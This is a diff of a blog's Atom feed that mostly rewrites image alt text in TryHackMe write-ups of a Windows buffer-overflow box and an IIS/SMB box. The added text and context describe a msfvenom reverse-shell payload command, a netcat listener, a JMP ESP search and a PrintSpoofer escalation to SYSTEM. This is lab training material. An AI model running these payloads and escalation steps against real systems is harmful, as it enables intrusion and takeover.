@@ -128,49 +128,49 @@ ftp&amp;gt; get essfunc.dll
 
 &lt;p&gt;first things first, let&amp;#39;s see how the program behaves in a regular context. launching the &lt;code&gt;chatserver.exe&lt;/code&gt;, we get a prompt to create a username and we&amp;#39;re then free to send messages away:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. a banner greets us and a prompt to enter our username and write a message appears."&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. a banner greets us and a prompt to enter our username and write a message appears"&gt;&lt;/p&gt;
 
 &lt;p&gt;the program outputs the following while listening for a connection and processing our username and messages:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="chatserver.exe logs screenshot. it outputs a call for its needed DLL, essfunc, then it&amp;#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen."&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="chatserver.exe logs screenshot. it outputs a call for its needed DLL, essfunc, then it&amp;#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen"&gt;&lt;/p&gt;
 
 &lt;p&gt;we might trigger a buffer overflow when creating our username or sending a message — or both. let&amp;#39;s test that. the basic fuzzer that we&amp;#39;re using is the following:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="a quick python script that does basic fuzzing on the app. it initiates the connection that we initially did manually, and sends an increasingly bigger string of &amp;quot;AAAAA&amp;quot; until chatserver crashes."&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="a quick python script that does basic fuzzing on the app. it initiates the connection that we initially did manually, and sends an increasingly bigger string of &amp;quot;AAAAA&amp;quot; until chatserver crashes"&gt;&lt;/p&gt;
 
 &lt;p&gt;we quickly see that username creation implements a character limit so we won&amp;#39;t trigger anything with this input:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="chatserver logs again, that show our script has been poorly thought out as it doesn&amp;#39;t account for the username creation step, which has a proper character limit and won&amp;#39;t overflow."&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="chatserver logs again, that show our script has been poorly thought out as it doesn&amp;#39;t account for the username creation step, which has a proper character limit and won&amp;#39;t overflow"&gt;&lt;/p&gt;
 
 &lt;p&gt;while editing the script to enter the username before fuzzing the app, i realized i could make it way simpler. i ended up rewriting it with the following:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="rewrite of the previous pyton script, which includes the username creation step and is much more concise."&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="rewrite of the previous pyton script, which includes the username creation step and is much more concise"&gt;&lt;/p&gt;
 
 &lt;p&gt;running the script, we notice that the app is crashing after sending 2100 bytes. we now have our starting point to work on the buffer overflow!&lt;/p&gt;
 
 &lt;p&gt;to find the EIP offset, we generate a pattern of 2400 bytes and whip up a short exploit script, quite simple like our fuzzing script:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="brainstorm_9"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="another python script with a payload of 2400 bytes that will help us locate the EIP offset with pattern_offset, a script present in kali linux"&gt;&lt;/p&gt;
 
 &lt;p&gt;crashing the app, we get the following EIP register value:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="brainstorm_10"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="screenshot of the EIP register value (31704330) as shown in immunity debugger"&gt;&lt;/p&gt;
 
 &lt;p&gt;which allows us to find the EIP offset:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="brainstorm_11"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="output of pattern_offset script, which deduces that the EIP offset is 2012 given the EIP register value"&gt;&lt;/p&gt;
 
 &lt;p&gt;by editing our exploit script, we can confirm that the EIP offset is correct:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="brainstorm_12"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="immunity screenshot showing the EIP register value (42424242) after changing our python script, to make sure that the offset is correct"&gt;&lt;/p&gt;
 
 &lt;p&gt;great, smooth sailing ahead of us. what we have to do next is sorting out the badchars and exploit the .dll for privilege escalation. mona will come in useful for the latter.&lt;/p&gt;
 
 &lt;p&gt;finding the badchars is a simple and boring process: we just add them to our payload and find out what went wrong in our esp dump.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="brainstorm_13"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="updated python script taking the offset we found into account, to inject the badchars properly and sort them out in the next step"&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="brainstorm_14"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="screenshot of our ESP dump in immunity debugger, showing that we don&amp;#39;t have any badchars except the null byte"&gt;&lt;/p&gt;
 
 &lt;p&gt;turns out we don&amp;#39;t have any badchars so we will be able to proceed without excluding them (except of course \x00). let&amp;#39;s work on the .dll file next.&lt;/p&gt;
 
@@ -178,36 +178,36 @@ ftp&amp;gt; get essfunc.dll
 
 &lt;p&gt;first, let&amp;#39;s take a look of the modules with mona. this is simply done with the &lt;code&gt;!mona modules&lt;/code&gt; command in immunity:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="brainstorm_15"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="output of the &amp;quot;!mona modules&amp;quot; command in immunity debugger, showing the .DLLs that chatserver.exe depends on along with their properties"&gt;&lt;/p&gt;
 
 &lt;p&gt;we can see that &lt;code&gt;essfunc.dll&lt;/code&gt; is a perfect candidate for privilege escalation because it has no memory protections whatsoever. if we can find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction that we can leverage for our payload, we should be good to go.&lt;br&gt;
 running &lt;code&gt;msf-nasm_shell&lt;/code&gt; on kali, we can see that the hex instruction for &lt;code&gt;JMP ESP&lt;/code&gt; is \xff\xe4:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="brainstorm_16"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="output of msf-nasm_shell, showing the hex instruction for JMP ESP"&gt;&lt;/p&gt;
 
 &lt;p&gt;to find this instruction in &lt;code&gt;essfunc.dll&lt;/code&gt;, mona will again prove to be useful. running &lt;code&gt;!mona find -s &amp;quot;\xff\xe4&amp;quot; -m essfunc.dll&lt;/code&gt; allow us to get the pointers for the instruction we&amp;#39;re looking for:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="brainstorm_17"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="output of &amp;quot;!mona find&amp;quot; command in immunity debugger, showing all the pointers leading to the &amp;quot;\xff\xe4&amp;quot; instruction"&gt;&lt;/p&gt;
 
 &lt;p&gt;let&amp;#39;s pick the first one and check if this works. we simply adjust our script with the address and change its endianness to match our win x86 target:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="brainstorm_18"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="python script updated with our JMP ESP instruction address, reversed to match the endianness"&gt;&lt;/p&gt;
 
 &lt;p&gt;and we put a breakpoint in immunity for the same address. running the exploit again, we notice that we have indeed control of the EIP:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="brainstorm_20"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="screenshot of immunity debugger showing the value of the EIP register, now set to our JMP ESP instruction address"&gt;&lt;/p&gt;
 
 &lt;p&gt;we&amp;#39;re now ready to add the payload in our script and test it against the real target. to generate a payload, we use msfvenom with the following parameters to match the corresponding architecture of our target, add only the null byte to our list of badchars and make it play nicely with python:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="brainstorm_21"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="output of &amp;quot;msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f python -b &amp;#39;\x00&amp;#39;&amp;quot; on kali linux. this generates our payload for a python script while excluding the null byte"&gt;&lt;/p&gt;
 
 &lt;p&gt;our script now looks like this (let&amp;#39;s not forget the nop sled too) and should hopefully be working:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="brainstorm_22"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="screenshot of our updated and final python script, ready to inject msfvenom&amp;#39;s payload"&gt;&lt;/p&gt;
 
 &lt;p&gt;let&amp;#39;s set up a netcat listener before running it with &lt;code&gt;nc -lvnp 4444&lt;/code&gt;. and sure enough, we end up getting elevated privileges on our target, just as planned!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="brainstorm_23"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="screenshot showing that we got a connection to our target. running the command &amp;quot;whoami&amp;quot; on windows outputs &amp;quot;nt authority\system&amp;quot;, proving that we have elevated privileges"&gt;&lt;/p&gt;
 </content>
   </entry>
   <entry>
@@ -485,10 +485,6 @@ endfu
 &lt;h2&gt;tl;dr: just give me the script!&lt;/h2&gt;
 
 &lt;p&gt;sure thing: &lt;a href="https://gist.github.com/ovelny/72659e841c1dbcee173eb244c8609252" rel="nofollow"&gt;https://gist.github.com/ovelny/72659e841c1dbcee173eb244c8609252&lt;/a&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;~ want to leave a comment about this post? you can send me a message on &lt;a href="https://curiouscat.qa/Ovelny" rel="nofollow"&gt;curiouscat&lt;/a&gt; without an account, or reply on &lt;a href="https://twitter.com/ovelny/status/1421421316205318145" rel="nofollow"&gt;twitter&lt;/a&gt; if you like!&lt;/p&gt;
-&lt;/blockquote&gt;
 </content>
   </entry>
   <entry>
@@ -585,9 +581,9 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class="p"&gt;;
 
 &lt;h3&gt;websites / web services&lt;/h3&gt;
 
-&lt;p&gt;both of the HTTP services lead us to the Microsoft IIS server default page:&lt;/p&gt;
+&lt;p&gt;both of the HTTP services lead us to the microsoft IIS server default page:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/1.jpg" alt="1.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/1.jpg" alt="screenshot of the default page for microsoft IIS server"&gt;&lt;/p&gt;
 
 &lt;p&gt;dirsearch results suggest something fishy. why would we have a directory traversal vulnerability for /etc/passwd on a windows server? looks like we might encounter some red herrings on this target.&lt;/p&gt;
 
@@ -704,7 +700,7 @@ Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
 
 &lt;p&gt;after some additional attempts on SMB, i gave up to focus on web services yet again. surely there has to be something more about them...&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/2.jpg" alt="2.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/2.jpg" alt="screenshot showing the same encoded passwords at http://IP:49663/n4twrksv/passwords.txt"&gt;&lt;/p&gt;
 
 &lt;p&gt;and there is! turns out all of &lt;code&gt;nt4wrksv&lt;/code&gt; contents are directly accessible through HTTP on port 49663. we might be able to get a reverse shell exactly the same way.&lt;/p&gt;
 
@@ -717,7 +713,7 @@ Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
 
 &lt;p&gt;enumerating privileges on our current user instantly shows us how we will escalate our privileges to &lt;code&gt;SYSTEM&lt;/code&gt;, since having &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; enabled instantly makes this box vulnerable to printspoofer64 (&lt;a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):" rel="nofollow"&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/3.jpg" alt="3.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/3.jpg" alt="output of &amp;quot;whoami /priv&amp;quot; command, showing that SeImpersonatePrivilege is indeed enabled on our target"&gt;&lt;/p&gt;
 
 &lt;h2&gt;privilege escalation&lt;/h2&gt;
 
@@ -727,7 +723,7 @@ Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
 
 &lt;p&gt;all that is left for us is to run the executable with &lt;code&gt;-i -c powershell&lt;/code&gt; flags enabled, so we can get an interactive powershell session as &lt;code&gt;SYSTEM&lt;/code&gt;:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/4.jpg" alt="4.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/4.jpg" alt="screenshot showing that &amp;quot;.\PrintSpoofer64.exe -i -c powershell&amp;quot; command granted us SYSTEM access to our target, as shown with the output of &amp;quot;whoami&amp;quot; command"&gt;&lt;/p&gt;
 
 &lt;p&gt;getting &lt;code&gt;Root.txt&lt;/code&gt; output is now in our hands.&lt;/p&gt;
 
